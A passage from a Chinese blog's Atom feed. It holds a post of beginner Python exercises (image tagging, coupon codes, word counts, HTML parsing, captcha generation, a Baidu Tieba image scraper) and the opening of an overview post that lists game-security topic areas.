      &lt;p&gt;这篇文章是接着上面一篇python一日一练（0-13），之所以分成两个部分倒不是为了增加自己的博客次数，而是发现自己在hexo生成静态博客后deploy到git上时，发现如果自己在之前的文章中做修改的话，hexo无法显示出这篇文章，原因尚不清楚。于是选择重新发一篇总结之后的几个任务。&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="http://venidic.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://venidic.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python一日一练（00-13）</title>
    <link href="http://venidic.com/2015/12/29/python%E4%B8%80%E6%97%A5%E4%B8%80%E7%BB%8300-13/"/>
    <id>http://venidic.com/2015/12/29/python一日一练00-13/</id>
    <published>2015-12-29T06:13:41.000Z</published>
    <updated>2016-01-19T14:59:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近看书实在是看不下去了，于是乎赶紧找些代码来压压惊，好在发现了一个不错的python练手的题目。相比较一些单纯的将一些无聊的算法翻来覆去的写，感觉这个有意思多了。<br><a id="more"></a></p>
<p>#0000</p>
<blockquote>
<p>将你的QQ头像或者微博头像右上角加上红色数字，类似于微信未读取信息数量的提示效果</p>
</blockquote>
<p>需要用到PIL库，这个库在处理图片上有着异常强大的功能<br>可以到<a href="http://pythonware.com/products/pil/" target="_blank" rel="external">Python Imaging Library (PIL)</a>下载相应平台的安装包<br>对应的<a href="http://effbot.org/imagingbook/" target="_blank" rel="external">The Python Imaging Library Handbook</a>为这个库的详细说明</p>
<p>下面直接看代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">#test0000</div><div class="line">from PIL import Image,ImageDraw,ImageFont</div><div class="line"></div><div class="line">class AddTagToPhoto:</div><div class="line">    def __init__(self):</div><div class="line">        self.image = None</div><div class="line">        self.number = None</div><div class="line">        self.x = 0</div><div class="line">        self.y = 0</div><div class="line"></div><div class="line"></div><div class="line">    def OpenImage(self, image_path):</div><div class="line">        self.image = Image.open(image_path)</div><div class="line">        return True</div><div class="line"></div><div class="line">    def AddNum(self, number):</div><div class="line">        num_size = max(self.image.size[0], self.image.size[1]) / 5</div><div class="line">        num_font = ImageFont.truetype(&apos;C:/windows/fonts/Arial.ttf&apos;,num_size)</div><div class="line">        num_color = &quot;#ff0000&quot;</div><div class="line">        self.x = self.image.size[0] - num_font.getsize(number)[0]</div><div class="line">        draw = ImageDraw.Draw(self.image)</div><div class="line">        draw.text((self.x,self.y),number,num_color,num_font)</div><div class="line"></div><div class="line">        self.image.save(&apos;photo&apos;+number+&apos;.jpg&apos;)</div><div class="line">        return True</div><div class="line"></div><div class="line">photo_tag = AddTagToPhoto()</div><div class="line">photo_tag.OpenImage(&quot;photo.jpg&quot;)</div><div class="line">photo_tag.AddNum(&apos;7&apos;)</div></pre></td></tr></table></figure>
<p><em>注：在执行过程中，windows平台可以考虑使用pillow库代替PIL，以防止出现各种奇葩的问题</em><br>下载地址：<a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#pil" target="_blank" rel="external">pillow</a></p>
<p>#0001</p>
<blockquote>
<p>作为Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），使用 Python 如何生成 200 个激活码（或者优惠券）？</p>
</blockquote>
<p>其实这些小题目主要是带动你对python库的理解，不得不说，python真的好强大。<br>这个题目挺简单的，主要考察对random和string的运用，顺带文件的操作<br>直接看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">#0001</div><div class="line">import random</div><div class="line">str = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line"></div><div class="line">def randkey(length):</div><div class="line">    key = &apos;&apos;</div><div class="line">    for i in range(length):</div><div class="line">        key += random.choice(str)</div><div class="line">    return key</div><div class="line"></div><div class="line">print randkey(200)</div></pre></td></tr></table></figure></p>
<p>来一个更强大一点的，运用uuid这个库，简直不要不要得<br><strong>UUID是128位全局唯一标识符，通常由32字节的字符组成，它可以保证时间和空间的唯一性</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">#0001</div><div class="line"></div><div class="line">import uuid</div><div class="line">print uuid.uuid1()</div><div class="line">print uuid.uuid3(uuid.NAMESPACE_DNS, &apos;venidic&apos;)</div><div class="line">print uuid.uuid4()</div><div class="line">print uuid.uuid5(uuid.NAMESPACE_DNS, &apos;venididc&apos;)</div></pre></td></tr></table></figure></p>
<p>上述代码中，</p>
<ol>
<li>uuid1()——基于时间戳，由MAC地址、当前时间戳、随机数生成。可以保证全球范围内的唯一性，但MAC的使用同时带来安全性问题，局域网中可以使用IP来代替MAC。</li>
<li>uuid2()——基于分布式计算环境DCE（Python中没有这个函数）算法与uuid1相同，不同的是把时间戳的前4位置换为POSIX的UID。实际中很少用到该方法。</li>
<li>uuid3()——基于名字的MD5散列值。通过计算名字和命名空间的MD5散列值得到，保证了同一命名空间中不同名字的唯一性，和不同命名空间的唯一性，但同一命名空间的同一名字生成相同的uuid。    </li>
<li>uuid4()——基于随机数。由伪随机数得到，有一定的重复概率，该概率可以计算出来。</li>
<li>uuid5()——基于名字的SHA-1散列值。算法与uuid3相同，不同的是使用 Secure Hash Algorithm 1 算法</li>
</ol>
<p>#0002</p>
<blockquote>
<p>将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。</p>
</blockquote>
<p>#0003</p>
<blockquote>
<p>将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 非关系型数据库中。</p>
</blockquote>
<p>#0004</p>
<blockquote>
<p>任一个英文的纯文本文件，统计其中的单词出现的个数。</p>
</blockquote>
<p>主要考察python 正则表达式的运用<br>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import re</div><div class="line">fin=open(&quot;in.txt&quot;,&quot;r&quot;)</div><div class="line">fout=open(&quot;out.txt&quot;,&quot;w&quot;)</div><div class="line">str=fin.read()</div><div class="line">reObj=re.compile(&quot;\b?([a-zA-Z]+)\b?&quot;)</div><div class="line">words=reObj.findall(str)</div><div class="line">word_dict=&#123;&#125;</div><div class="line">count_word = 0</div><div class="line">count_character = 0</div><div class="line">for word in words:</div><div class="line">    count_word += 1</div><div class="line">    count_character += len(word)</div><div class="line">    if(word_dict.has_key(word)):</div><div class="line">        word_dict[word.lower()]=max(word_dict[word.lower()],words.count(word.lower())+words.count(word.upper())+words.count(word))</div><div class="line">    else:</div><div class="line">        word_dict[word.lower()]=max(0,words.count(word.lower())+words.count(word.upper())+words.count(word))</div><div class="line"></div><div class="line"></div><div class="line">fout.write(&quot;count_word:%d\n&quot;%count_word+&quot;count_character:%d\n&quot;%count_character)</div><div class="line">fout.write(&quot;Anly this article:\n&quot;)</div><div class="line"></div><div class="line">for(word,number) in word_dict.items():</div><div class="line">    fout.write(word+&quot;:%d\n&quot;%number)</div></pre></td></tr></table></figure></p>
<p>#0005</p>
<blockquote>
<p>你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。</p>
</blockquote>
<p>这个题目仍然考察的是python对图像的处理，所以还是对PIL库的用法。为了方便修改多张照片的分辨率，同时引入glob模块<br>具体参见代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">from PIL import Image</div><div class="line">import glob,os</div><div class="line"></div><div class="line">def photo_resize(width, height):</div><div class="line">    for infile in glob.glob(&quot;*.jpg&quot;):</div><div class="line">        jpg_path,ext = os.path.splitext(infile)</div><div class="line">        jpg = Image.open(infile)</div><div class="line">        (jpg_width, jpg_height) = jpg.size</div><div class="line">        if jpg_width &gt; width:</div><div class="line">            jpg_height = jpg_height * width // jpg_width</div><div class="line">            jpg_width = width</div><div class="line">        if jpg_height &gt; height:</div><div class="line">            jpg_width = jpg_width * height // jpg_height</div><div class="line">            jpg_height = height</div><div class="line">        jpg_change = jpg.resize((jpg_width,jpg_height),Image.ANTIALIAS)</div><div class="line">        jpg_change.save(&quot;_&quot;+jpg_path + &quot;.jpg&quot;, &quot;JPEG&quot;)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    photo_resize(1366,768)</div></pre></td></tr></table></figure></p>
<p>这里可以直接通过参数将自己想要的分辨率穿进去，因为没有土豪phone，所以并不清楚土豪phone的分辨率ಥ_ಥ</p>
<p>#0006</p>
<blockquote>
<p>你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词</p>
</blockquote>
<p>这个题目跟上面的第4题有些类似，只不过第4题是统计一篇文章里面字符拼读，而这一题是统计一个文件夹里面所有文件的字符拼读，稍微改下就可以实现要求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import re</div><div class="line">import os,glob</div><div class="line"></div><div class="line"></div><div class="line">def anlykeyfromdirect():</div><div class="line">    str = &quot;&quot;</div><div class="line">    for infile in glob.glob(&quot;*.txt&quot;):</div><div class="line">        txt_path,ext = os.path.splitext(infile)</div><div class="line">        print (infile)</div><div class="line">        txt_file = open(infile,&quot;r&quot;)</div><div class="line">        str += txt_file.read()</div><div class="line">        str += &quot;\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">    reObj = re.compile(&quot;\b?([a-zA-Z]+)\b?&quot;)</div><div class="line">    words = reObj.findall(str)</div><div class="line">    word_dict = &#123;&#125;</div><div class="line"></div><div class="line">    for word in words:</div><div class="line">        if(word_dict.has_key(word)):</div><div class="line">            word_dict[word.lower()] = max(word_dict[word.lower()],words.count(word.lower())+words.count(word.upper())+words.count(word))</div><div class="line">        else:</div><div class="line">            word_dict[word.lower()] = max(0,words.count(word.lower())+words.count(word.upper())+words.count(word))</div><div class="line"></div><div class="line">    fout = open(&quot;anly.txt&quot;,&quot;w&quot;)</div><div class="line">    for(word,number) in word_dict.items():</div><div class="line">        fout.write(word+&quot;:%d\n&quot;%number)</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    anlykeyfromdirect()</div></pre></td></tr></table></figure></p>
<p>#0007</p>
<blockquote>
<p>有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。</p>
</blockquote>
<p>思路很简单，统计行数的话需要统计“\n”，稍微难一点的就在对于目录的遍历，编程文件的甄别，对空行和注释的判断。其中对注释的判断稍微显得麻烦，要考虑到注释行和注释块所占的行数。具体参加代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import os</div><div class="line">#add file type if you want to anly</div><div class="line">file_type_anly = (&apos;.c&apos;, &apos;.h&apos;, &apos;.cpp&apos;)</div><div class="line"></div><div class="line">def CodeAnly(code_file_path):</div><div class="line">    #init</div><div class="line">    line_note = line_blank = line_total = line_count = 0</div><div class="line">    flag = False</div><div class="line">    with open(code_file_path) as f:</div><div class="line">        lines = f.readlines()</div><div class="line">        line_total = len(lines)</div><div class="line">        for line_temp in lines:</div><div class="line">            line_temp = line_temp.strip()</div><div class="line">            if line_temp == &apos;&apos;:</div><div class="line">                line_blank += 1</div><div class="line">            elif line_temp.startswith(&quot;//&quot;):</div><div class="line">                line_note += 1</div><div class="line">            elif (line_temp.startswith(&apos;/*&apos;) and True == line_temp.endswith(&apos;*/&apos;)):</div><div class="line">                line_note += 1</div><div class="line">            elif (line_temp.startswith(&apos;/*&apos;) and False == line_temp.endswith(&apos;*/&apos;)):</div><div class="line">                line_note += 1</div><div class="line">                flag = True</div><div class="line">            elif flag == True:</div><div class="line">                line_note += 1</div><div class="line">                if line_temp.endswith(&apos;*/&apos;):</div><div class="line">                    flag = False</div><div class="line"></div><div class="line">    print (&apos;%s: \n\tCodeLines:%d \n\tLineBlank:%d  \n\tLineNotes:%d&apos;%(code_file_path, line_total, line_blank, line_note))</div><div class="line">    return (line_total, line_blank, line_note)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def GetFile(root):</div><div class="line">    for lists in os.listdir(root):</div><div class="line">        path = os.path.join(root,lists)</div><div class="line">        #print path</div><div class="line">        if os.path.isdir(path):</div><div class="line">            GetFile(path)</div><div class="line">        if os.path.isfile(path):</div><div class="line">        #anly file type</div><div class="line">            infile_name, infile_type = os.path.splitext(path)</div><div class="line">            if infile_type in file_type_anly:</div><div class="line">                (temp1, temp2, temp3) = CodeAnly(path)</div><div class="line">               </div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    GetFile(r&apos;F:\\temp&apos;)</div></pre></td></tr></table></figure></p>
<p>其中也可以用正则代替部分代码<br>因为要判断代码中的空行和注释，所以这里没有选择使用<code>enumerate</code>，如果没有空行和注释的需求，则可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def linecount(filepath):</div><div class="line">    count = -1</div><div class="line">    for count, line in enumerate(open(filepath, &apos;rU&apos;)):</div><div class="line">        pass</div><div class="line">    count += 1</div><div class="line">    return count</div></pre></td></tr></table></figure></p>
<p>如果是大文件的话，可以使用<code>linecache</code>库，效率也挺高的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">import linecache</div><div class="line">count = linecache.getline(filename,linenum)</div></pre></td></tr></table></figure></p>
<p>用自己的代码统计了下在鹅厂实习的那两个月，前前后后写的代码竟然竟然有将近12w呃，虽然里面有些重复的版本，引用第三方的库（逃<br>不过想想，几万行也是写到了嘛，好歹人家一个搞逆向分析的，哼(；◔ิω◔ิ)</p>
<p>#0008</p>
<blockquote>
<p>一个HTML文件，找出里面的正文</p>
</blockquote>
<p>本题目主要考察对python的<code>Beautiful Soup</code>库的使用，它可以从HTML和XML中提取数据。<br>下面是官方说明文档：<br><a href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#id5" target="_blank" rel="external">Beautiful Soup 4.2.0 文档</a><br>使用了这个库，这个题目就变得很简单了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">def find_the_content(path):</div><div class="line">    fout = open(&quot;out.txt&quot;,&quot;w&quot;)</div><div class="line">    with open(path) as f:</div><div class="line">        text = BeautifulSoup(f, &apos;html.parser&apos;)</div><div class="line">        content = text.get_text().strip(&apos;\n&apos;)</div><div class="line">        fout.write(content.encode(&apos;gbk&apos;,&apos;ignore&apos;))</div><div class="line">       </div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">     find_the_content(&apos;1.html&apos;)</div></pre></td></tr></table></figure></p>
<p>关于<code>BeautifulSoup</code>这个函数的使用上，可以选择相应的html的解释器，这里我使用了python自带，对小文件解析效果不错，其他的<code>lxml，html5lib</code>可以参考上述的官方说明文档对应部分。</p>
<p>#0009</p>
<blockquote>
<p>一个HTML文件，找出里面的链接</p>
</blockquote>
<p>仍然可以使用<code>BeautifulSoup</code>解决这些问题，具体参加代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">def find_the_link(path):</div><div class="line">    fout = open(&apos;out.txt&apos;, &apos;w&apos;)</div><div class="line">    with open(path) as f:</div><div class="line">        soup = BeautifulSoup(f, &apos;html.parser&apos;)</div><div class="line">        for link in soup.find_all(&apos;a&apos;):</div><div class="line">            content = link.get(&apos;href&apos;)</div><div class="line">            fout.write(content.encode(&apos;gbk&apos;, &apos;ignore&apos;) + &apos;\n&apos;)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">     find_the_link(&apos;1.html&apos;)</div></pre></td></tr></table></figure></p>
<p>#0010</p>
<blockquote>
<p>使用 Python 生成类似于下图中的字母验证码图片</p>
</blockquote>
<p><em>这里是图片描述：字母数字随机，具有模糊效果</em><br>生成随机的数字上面在0001中已经有详细的参考代码，主要是图片模糊和噪点效果，大体算法是通过颜色随机，在生成验证码的图片上绘制噪点。需要python下面的PIL库，具体参加代码（<em>代码转自Jaccorot</em>）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;Jaccorot&apos;</div><div class="line">from PIL import Image, ImageDraw, ImageFont, ImageFilter</div><div class="line">import random</div><div class="line"></div><div class="line">IMAGE_MODE = &apos;RGB&apos;</div><div class="line">IMAGE_BG_COLOR = (255,255,255)</div><div class="line">Image_Font = &apos;arial.ttf&apos;</div><div class="line">text = &apos;&apos;.join(random.sample(&apos;abcdefghijklmnopqrstuvwxyz\</div><div class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;,4))</div><div class="line"></div><div class="line">def colorRandom():</div><div class="line">    return (random.randint(32,127),random.randint(32,127),random.randint(32,127))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def create_identifying_code(strs, width=400, height=200, chance=2):</div><div class="line">    im = Image.new(IMAGE_MODE, (width, height), IMAGE_BG_COLOR)</div><div class="line">    draw = ImageDraw.Draw(im)</div><div class="line"></div><div class="line">    for w in xrange(width):</div><div class="line">        for h in xrange(height):</div><div class="line">            if chance &lt; random.randint(1, 100):</div><div class="line">                draw.point((w, h), fill=colorRandom())</div><div class="line"></div><div class="line">    font = ImageFont.truetype(Image_Font, 80)</div><div class="line">    font_width, font_height = font.getsize(strs)</div><div class="line">    strs_len = len(strs)</div><div class="line">    x = (width - font_width)/2</div><div class="line">    y = (height - font_height)/2</div><div class="line"></div><div class="line">    for i in strs:</div><div class="line">        draw.text((x,y), i, colorRandom(), font)</div><div class="line">        x += font_width/strs_len</div><div class="line"></div><div class="line">    im = im.filter(ImageFilter.BLUR)</div><div class="line">    im.save(&apos;identifying_code_pic.jpg&apos;)</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    create_identifying_code(text)</div></pre></td></tr></table></figure></p>
<p>#0011</p>
<blockquote>
<p> 敏感词文本文件filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。</p>
<p>北京<br>程序员<br>公务员<br>领导<br>牛比<br>牛逼<br>你娘<br>你妈<br>love<br>sex<br>jiangge</p>
</blockquote>
<p>#0012</p>
<blockquote>
<p>敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 <em> 替换，例如当用户输入「北京是个好城市」，则变成「*</em>是个好城市」。</p>
</blockquote>
<p>#0013</p>
<blockquote>
<p>用 Python 写一个爬图片的程序</p>
</blockquote>
<p>爬 <a href="http://tieba.baidu.com/p/2166231880" target="_blank" rel="external">这个链接里的日本妹子图片 :-)</a></p>
<p>最喜欢解决这种问题了，想想爬妹子的照片就忍不住激动。之前用c++写了一个类似的爬取图片的程序，后来就没有再改进了。这次趁着自己学习python的时候，打算好好攻下python网络这块和<code>scrapy</code><br>单单就这个题目而言，思路也挺简单：获取图片链接+保存图片 即可。因为python web这一块的库实在太多，所以实现方式也有很多，下面是我的实现方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import os</div><div class="line">import urllib</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">from urlparse import urlsplit</div><div class="line"></div><div class="line">def DownloadPic(url):</div><div class="line">    image_content = urllib.urlopen(url).read()</div><div class="line">    filename = os.path.basename(urlsplit(url)[2])</div><div class="line">    pout = open(r&apos;photo/&apos;+filename, &apos;wb&apos;)</div><div class="line">    pout.write(image_content)</div><div class="line">    pout.close()</div><div class="line"></div><div class="line">def FindPic(url):</div><div class="line">    if False == os.path.isdir(&apos;photo&apos;):</div><div class="line">        os.mkdir(&apos;photo&apos;)</div><div class="line">    content = urllib.urlopen(url)</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    for img in soup.find_all(&apos;img&apos;, &#123;&apos;class&apos;: &apos;BDE_Image&apos;&#125;):</div><div class="line">        DownloadPic(img[&apos;src&apos;])</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    FindPic(&apos;http://tieba.baidu.com/p/2166231880&apos;)</div></pre></td></tr></table></figure></p>
<p><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0578weoqej20om0cwwil.jpg" alt=""><br>目前只针对百度贴吧中图片可适用，后续先会将爬虫改为遍历网页自动爬取，然后会写针对知乎和豆瓣写出相应爬虫，敬请期待…</p>
<p><em>未完待续，持续更新中……</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近看书实在是看不下去了，于是乎赶紧找些代码来压压惊，好在发现了一个不错的python练手的题目。相比较一些单纯的将一些无聊的算法翻来覆去的写，感觉这个有意思多了。&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="http://venidic.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://venidic.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>游戏安全入门浅谈</title>
    <link href="http://venidic.com/2015/12/06/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%B5%85%E8%B0%88/"/>
    <id>http://venidic.com/2015/12/06/游戏安全入门浅谈/</id>
    <published>2015-12-05T16:08:32.000Z</published>
    <updated>2015-12-05T17:25:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前田哒哒问过我关于游戏安全入门的一些建议，后来自己给搞忘记了， 今天没事的时候逛论坛的时候发现了这个问题，于是想想决定总结一下，给之后对游戏安全感兴趣的学弟（或者学妹呃）一些可能的帮助。<br><a id="more"></a><br>我记得在今年实习之前就写过两篇软文<br><a href="http://venidic.com/2015/04/23/%E5%AE%89%E5%85%A8%E5%B2%97%E5%AE%9E%E4%B9%A0%E7%94%9F%E5%BA%94%E8%81%98/">安全岗实习生应聘</a><br><a href="http://venidic.com/2015/05/06/%E5%AF%B9%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A4%E8%AF%86/">对游戏安全的一些认识</a><br>这些是在自己实习之前通过面试官的一些提问自己琢磨的一些理解或者感悟，后来去公司实习了2个来月，怎么说呢，通过自己的一些实践可能对游戏安全的体验和理解要稍微更到位一些。于是打算在写一篇软文来瞎扯一下哈哈哈。</p>
<p>#游戏安全分类<br>在《网络游戏安全揭密》中，作者将游戏安全分为了3个方面（<em>感谢bru爷把自己的书借我，说好的在实习期给您一篇读书笔记的，后来结束的时候一直想着开发个工具也没能将后两章的笔记结束，然后在归还电脑的时候将md给格掉了，心碎了…</em>）。结合着业务相关（主要是网络方面）可以将作者的分类扩充到4个方面：</p>
<ul>
<li>游戏之上：游戏之上用户层，包含UI绘制，设计模式，系统架构，游戏引擎，消息响应；</li>
<li>游戏之中：游戏内部相应机制，涉及到游戏逻辑分析，逆向工程，hook技术，注入技术，patch技术，异常回调和处理，以及反调和加壳；</li>
<li><p>游戏之下：游戏运行在系统之上，所以在游戏底层，涉及到驱动过滤，驱动拦截，驱动开发，驱动适配，系统运行机制，消息处理机制，rootkit及反rootkit</p>
</li>
<li><p>游戏之路：游戏涉及到与服务器的交互，所以在交互层设计到上下行协议分析，报文加密，服务端并发处理，及反ddos</p>
</li>
</ul>
<p>在实际业务中，可以将安全跟业务结合起来，又可以分为</p>
<ul>
<li>外挂对抗及方案保护：外挂原理分析及反外挂方案提出</li>
<li>游戏分析及漏洞挖掘：游戏自身安全，逻辑问题</li>
<li>增值服务及游戏助手：分析及提取游戏数据，开发相应辅助</li>
<li>前端保护及后台分析：游戏保护，反调，日志统计，行为分析</li>
</ul>
<p>具体到游戏之中，又可以将游戏安全分为：</p>
<ul>
<li>攻击方向：<ul>
<li>外挂开发：分析游戏开发相应功能外挂</li>
<li>外挂安全：版本适配，绕过外挂检测，反反调试</li>
</ul>
</li>
<li>防御方向：<ul>
<li>游戏逻辑：游戏自身逻辑安全验证</li>
<li>游戏漏洞：游戏自身漏洞排除</li>
<li>游戏反调：防止分析有序</li>
<li>外挂检测：检测可能存在的外挂</li>
</ul>
</li>
</ul>
<p>#游戏安全知识<br>在这里我仅仅针对外挂开发，游戏反调所涉及到的一些知识做一些总结，关于其他的我也不是很清楚哈哈。</p>
<ul>
<li><p>游戏分析</p>
<ul>
